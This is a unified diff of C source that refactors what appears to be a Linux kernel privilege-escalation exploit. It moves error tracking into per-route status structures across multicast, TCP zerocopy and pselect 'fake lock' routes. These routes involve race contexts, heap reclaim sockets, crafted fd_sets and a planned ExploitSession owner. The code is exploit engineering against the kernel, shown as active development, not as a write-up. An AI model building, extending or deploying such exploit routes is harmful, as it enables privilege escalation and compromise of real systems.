@@ -18,9 +18,6 @@ static double fops_elapsed_ms(struct timespec *ref) {
 static const struct execution_settings *execution_settings(void) {
   return target_profile_execution(&g_target_profile);
 }
-int route_last_step;
-int route_last_errno;
-
 /* One process-level resident is retained across W1/W2. Its mutable state and
  * resources have one explicit owner; S14 will move that owner into session. */
 static MulticastWaiterRouteContext multicast_resident_context;
@@ -207,7 +204,7 @@ void kernel5_resident_stop(void) {
   }
   multicast_waiter_disarm(context);
   multicast_waiter_destroy(context);
-  /* TODO(decoupling:S14-multicast-heap-handoff): These HeapContext actions
+  /* TODO(post-S15:SESSION-04): These HeapContext actions
    * remain here only to preserve the validated W1/W2 stop order. Move them to
    * ExploitSession after route destroy reports userspace_clean. */
   close_reclaim_sockets(); cleanup_page_prepare_state();
@@ -230,10 +227,8 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
 
   int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
   if (fd < 0) {
-    route_last_step = 60;
-    route_last_errno = errno;
-    status.step = route_last_step;
-    status.error_number = route_last_errno;
+    status.step = 60;
+    status.error_number = errno;
     status.userspace_clean = 1;
     status.kernel_disarmed = 1;
     status.code = ROUTE_FALLBACK_SAFE;
@@ -246,7 +241,8 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
   errno = 0;
   int stamp_result =
       setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
-  route_last_step = 61; route_last_errno = errno;
+  status.step = 61;
+  status.error_number = errno;
   atomic_store(&g_pi_race_context.consumer_go, 1);
   for (int spin = 0; spin < 100000000 &&
        atomic_load(&g_pi_race_context.consumer_calls) == 0; spin++)
@@ -259,17 +255,15 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
   status.kernel_disarmed = 1;
   if (stamp_result == 0 ||
       atomic_load(&g_pi_race_context.consumer_success) > 0) {
-    route_last_step = 0;
-    route_last_errno = 0;
+    status.step = 0;
+    status.error_number = 0;
     status.code = ROUTE_OK;
   } else {
     status.code = ROUTE_FALLBACK_SAFE;
   }
-  status.step = route_last_step;
-  status.error_number = route_last_errno;
   pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
           status.code, status.userspace_clean, status.kernel_disarmed,
-          route_last_step, route_last_errno);
+          status.step, status.error_number);
   return status;
 }
 
@@ -385,8 +379,6 @@ static int tcp_zerocopy_fail(TcpZerocopyRouteContext *context,
                              int step, int error_number) {
   context->status.step = step;
   context->status.error_number = error_number;
-  route_last_step = step;
-  route_last_errno = error_number;
   return -1;
 }
 
@@ -476,7 +468,8 @@ static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
     if (atomic_load(&context->punch_failed)) {
       tcp_zerocopy_fail(context, 46,
                         atomic_load(&context->punch_failed));
-      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
+      pr_warning("tcp route puncher failed errno=%d\n",
+                 context->status.error_number);
       break;
     }
 
@@ -518,8 +511,8 @@ static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
      * stages verify their own effects; no cfi stage here. */
     context->route_won = 1;
     context->status.code = ROUTE_OK;
-    route_last_step = 0;
-    route_last_errno = 0;
+    context->status.step = 0;
+    context->status.error_number = 0;
   }
   if (!context->route_won && context->status.step == 0) {
     tcp_zerocopy_fail(context, 45, 0);
@@ -584,9 +577,6 @@ RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
   tcp_zerocopy_route_context_init(
       &context, &g_pi_race_context, request, execution_settings(),
       TCP_PUNCH_SHMEM_LEN);
-  route_last_step = 0;
-  route_last_errno = 0;
-
   if (tcp_zerocopy_prepare(&context) == 0) {
     tcp_zerocopy_execute(&context);
   }
@@ -682,7 +672,7 @@ static void pselect_put_waiter_word(
 /* Decoupling plan: materialize descriptors selected by the crafted fd_sets.
  * Inputs: sets and source fds; output: owned duplicated descriptors. Future:
  * select_stack_open_fds(SelectStackRouteContext *, const SelectStackSets *). */
-void open_selected_fds(
+static void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
   /* every bit lands on the read end so select/pselect parks the full window */
   (void)write_fd;
@@ -797,26 +787,10 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
   }
 }
 
-/* Compatibility helper retained until S15; route execution uses its context. */
-void prepare_pselect_fdsets(
-    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request) {
-  SelectStackRouteContext context;
-  select_stack_route_context_init(
-      &context, &g_pi_race_context, request, execution_settings(),
-      target_profile_select_stack_layout(&g_target_profile),
-      standard_io_backup);
-  select_stack_build_fdsets(&context);
-  *in = context.input_set;
-  *out = context.output_set;
-  *ex = context.exception_set;
-}
-
 static int select_stack_fail(SelectStackRouteContext *context,
                              int step, int error_number) {
   context->status.step = step;
   context->status.error_number = error_number;
-  route_last_step = step;
-  route_last_errno = error_number;
   return -1;
 }
 
@@ -921,8 +895,6 @@ static RouteStatus select_stack_execute(SelectStackRouteContext *context) {
     context->status.code = ROUTE_OK;
     context->status.step = 0;
     context->status.error_number = 0;
-    route_last_step = 0;
-    route_last_errno = 0;
   } else {
     select_stack_fail(context, 33, context->select_errno);
   }
@@ -979,7 +951,7 @@ static void select_stack_destroy(SelectStackRouteContext *context) {
 }
 
 RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
-  /* TODO(decoupling:S14-select-retry-controller): Compact outer retries must
+  /* TODO(post-S15:SELECT-01): Compact outer retries must
    * rebuild both HeapContext payload ownership and PiRaceContext sequencing.
    * Keep this route invocation single-shot until ExploitSession can create a
    * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
@@ -988,8 +960,6 @@ RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
       &context, &g_pi_race_context, request, execution_settings(),
       target_profile_select_stack_layout(&g_target_profile),
       standard_io_backup);
-  route_last_step = route_last_errno = 0;
-
   if (select_stack_prepare(&context) == 0) {
     select_stack_execute(&context);
   }
